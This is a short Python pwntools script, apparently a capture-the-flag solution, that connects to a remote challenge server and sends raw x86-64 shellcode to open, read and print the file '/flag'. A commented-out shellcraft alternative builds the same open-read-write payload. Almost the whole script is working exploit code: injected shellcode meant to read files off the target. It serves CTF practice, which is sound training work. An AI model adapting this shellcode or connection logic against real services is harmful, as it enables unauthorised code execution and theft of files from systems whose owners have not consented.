#-*- coding: utf-8 -*-
from pwn import *

r = remote("c083b2e3.tendollar.kr", 10000)
print r.recvuntil("> ")

# http://shell-storm.org/shellcode/files/shellcode-878.php
# modifying file name and file name length from the shellcode
sc = "\xeb\x3f\x5f\x80\x77\x05\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x66\x6c\x61\x67\x41"

# shellcraft version
'''
sc = shellcraft.amd64.open('/flag')
sc += shellcraft.amd64.read('rax', 'rsp', 0x100)
sc += shellcraft.amd64.write(1, 'rsp', 0x100)

sc = asm(sc, arch='amd64')
'''

r.send(sc)
r.interactive()
